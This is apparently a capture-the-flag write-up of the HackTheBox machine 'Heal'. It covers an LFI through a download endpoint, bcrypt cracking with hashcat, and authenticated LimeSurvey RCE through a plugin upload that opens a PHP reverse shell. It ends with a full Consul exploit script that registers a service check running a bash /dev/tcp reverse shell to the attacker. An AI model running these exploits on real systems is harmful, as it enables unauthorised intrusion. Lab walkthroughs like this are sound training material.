---
title: Heal
tags:
  - HackTheBox
  - Medium
  - Linux
  - LFI
  - Ruby
  - LimeSurvey
  - Brute-Forcing
  - Consul
  - CVE
date: 2025-05-09T00:00:05Z
---
![](Pasted%20image%2020250509175654.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.46 heal.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- heal.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
|_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
80/tcp open  http
|_http-title: Heal
```

So I checked its website:

![](Pasted%20image%2020250509175840.png)

I can try to create a new account:

![](Pasted%20image%2020250509180609.png)

There was an error saying something went wrong:

![](Pasted%20image%2020250509180624.png)

If we search the inside the chunks (`http://heal.htb/static/js/main.chunk.js`) we can easily find a vhost not detected by **ffuf**:

![](Pasted%20image%2020250509181404.png)

Apparently you need this endpoint to enable login and signup. So I'll add the new vhost.
There is also another endpoint called `take-survey.heal.htb`, which I'll also add.

The website is using Ruby Rails version 7.1.4:

![](Pasted%20image%2020250509181708.png)

Now I could successfully sign up:

![](Pasted%20image%2020250509181803.png)

I checked the survey endpoint which lead me to the other vhost:

![](Pasted%20image%2020250509182126.png)

I tried testing the "Export PDF" functionality:

![](Pasted%20image%2020250509182441.png)

I checked again the main chunk to find out api endpoints. It has the following ones:
- `signin`
- `signup`
- `profile`
- `logout`
- `resume`
- `download?filename=${filename}`

I note the last one, which may be a possible LFI. So I performed a petition to that endpoint but I needed a token, so I started performing a POST request to the `signin` endpoint:

![](Pasted%20image%2020250509184619.png)

Got my token `eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ`.

Now if I capture the petition of "Export PDF"  I can modify the `/download` petition to the api and test for LFI:

![](Pasted%20image%2020250509185407.png)

## Exploitation

Inserting the payload `/etc/passwd` after making the `OPTIONS` petition in the `GET` petition I can perform an LFI:

![](Pasted%20image%2020250509185628.png)

Now it's possible that I have to read a specific file, like a database or a configuration file. So I checked the chunks again to search for configuration files. I can read the `config/database.yml`

![](Pasted%20image%2020250509191039.png)

So apparently the database is inside `/storage/development.sqlite3`, so I can read my password and the user `ralph`'s password:

![](Pasted%20image%2020250509191316.png)

Got hashed credentials: `$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG`. It is stored in bcrypt:

![](Pasted%20image%2020250509191456.png)

So now I'll use **hashcat** to crack the password:

```shell
hashcat -m 3200 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt
```

Got credentials `ralph:147258369`, but they don't work anywere.

## Reconnaissance x2

So I'll check back the `take-survey.heal.htb`:

![](Pasted%20image%2020250509192505.png)

It mentions that the admin is `ralph`, so I'll run [dirsearch 📁](/notes/tools/dirsearch.md) to find hidden endpoints:

```shell
dirsearch -u http://take-survey.heal.htb/ -x 503

[redacted]
[19:27:54] 302 -    0B  - /admin/_logs/access-log  ->  http://take-survey.heal.htb/index.php/admin/authentication/sa/login
```

So I'll access `http://take-survey.heal.htb/index.php/admin/authentication/sa/login`:

![](Pasted%20image%2020250509193047.png)

Found an admin login, so I'll try the previous `ralph`'s credentials:

![](Pasted%20image%2020250509193142.png)

It worked! It is using version 6.6.4:

![](Pasted%20image%2020250509193215.png)

## Weaponization

I searched for "limesurvey 6.6.4 cve" and found [CVE-2021-44967](https://github.com/Y1LD1R1M-1337/Limesurvey-RCE).

## Exploitation

**LimeSurvey Authenticated RCE** Proof of Concept:

1. Create your files (config.xml and php reverse shell files)
2. Create archive with these files
3. Login with credentials
4. Go Configuration -> Plugins -> Upload & Install
5. Choose your zipped file
6. Upload
7. Install
8. Start your listener
9. Go url+{upload/plugins/#Name/#Shell_file_name}
10. Get reverse shell ![](Pasted%20image%2020250509193621.png)

Contents of `Config.xml`:

```shell
<?xml version="1.0" encoding="UTF-8"?>
<config>
    <metadata>
        <name>gitblanc</name>
        <type>plugin</type>
        <creationDate>2020-03-20</creationDate>
        <lastUpdate>2020-03-31</lastUpdate>
        <author>gitblanc</author>
        <authorUrl>https://github.com/gitblanc</authorUrl>
        <supportUrl>https://github.com/gitblanc</supportUrl>
        <version>6.6.4</version>
        <license>GNU General Public License version 2 or later</license>
        <description>
                <![CDATA[Author : gitblanc]]></description>
    </metadata>

    <compatibility>
        <version>6.0</version>
        <version>5.0</version>
        <version>4.0</version>
        <version>3.0</version>
    </compatibility>
    <updaters disabled="disabled"></updaters>
</config>
```

I uploaded, then I click on Install:

![](Pasted%20image%2020250509194330.png)

==Do not activate it==

> I now open `http://take-survey.heal.htb/upload/plugins/gitblanc/php-rev.php` and got a reverse shell :D

## Pivoting

I can search for the LimeSurvey configuration file inside `/var/www/limesurvey/application/config/config.php`:

```php
 'db' => array(
                        'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
                        'emulatePrepare' => true,
                        'username' => 'db_user',
                        'password' => 'AdmiDi0_pA$$w0rd',
                        'charset' => 'utf8',
                        'tablePrefix' => 'lime_',
                ),
```

I connected as `ron` with the password `AdmiDi0_pA$$w0rd` and worked!:

### User flag

![](Pasted%20image%2020250509200500.png)

## Privilege Escalation

I scanned for open ports and found a weird one:

```shell
netstat -ant

[redacted]
tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN
```

```shell
curl -S 127.0.0.1:8500
<a href="/ui/">Moved Permanently</a>.
```

So I'll forward that port to my machine:

```shell
ssh -L 8888:127.0.0.1:8500 ron@heal.htb
```

Now I'll visit `http://127.0.0.1:8888`:

![](Pasted%20image%2020250509201329.png)

It is running Consul version 1.19.2. Consul is a service networking platform developed by HashiCorp. To log in in the administrator panel, I need a token:

![](Pasted%20image%2020250509201732.png)

I can found it inside the Consul config:

```shell
cat /etc/consul.d/config.json 
{
"bootstrap":true,
"server": true,
"log_level": "DEBUG",
"enable_syslog": true,
"enable_script_checks": true,
"datacenter":"server1",
"addresses": {
        "http":"127.0.0.1"
},
"bind_addr": "127.0.0.1",
"node_name":"heal-internal",
"data_dir":"/var/lib/consul",
"acl_datacenter":"heal-server",
"acl_default_policy":"allow",
"encrypt":"l5/ztsxHF+OWZmTkjlLo92IrBBCRTTNDpdUpg2mJnmQ="
}
```

## Weaponization x2

I searched for "Consul 1.19 cve" and found [This exploit](https://www.exploit-db.com/exploits/51117).

```python
# Exploit Title: Hashicorp Consul v1.0 - Remote Command Execution (RCE)
# Date: 26/10/2022
# Exploit Author: GatoGamer1155, 0bfxgh0st
# Vendor Homepage: https://www.consul.io/
# Description: Exploit for gain reverse shell on Remote Command Execution via API
# References: https://www.consul.io/api/agent/service.html
# Tested on: Ubuntu Server
# Software Link: https://github.com/hashicorp/consul

import requests, sys

if len(sys.argv) < 6:
    print(f"\n[\033[1;31m-\033[1;37m] Usage: python3 {sys.argv[0]} <rhost> <rport> <lhost> <lport> <acl_token>\n")
    exit(1)

target = f"http://{sys.argv[1]}:{sys.argv[2]}/v1/agent/service/register"
headers = {"X-Consul-Token": f"{sys.argv[5]}"}
json = {"Address": "127.0.0.1", "check": {"Args": ["/bin/bash", "-c", f"bash -i >& /dev/tcp/{sys.argv[3]}/{sys.argv[4]} 0>&1"], "interval": "10s", "Timeout": "864000s"}, "ID": "gato", "Name": "gato", "Port": 80}

try:
    requests.put(target, headers=headers, json=json)
    print("\n[\033[1;32m+\033[1;37m] Request sent successfully, check your listener\n")
except:
    print("\n[\033[1;31m-\033[1;37m] Something went wrong, check the connection and try again\n")   
```

## Exploitation x2

I'll run the exploit:

```shell
python exploit_consul.py 127.0.0.1 8888 10.10.14.17 777 a
```

### Root flag

![](Pasted%20image%2020250509203202.png)

==Machine pwned!==

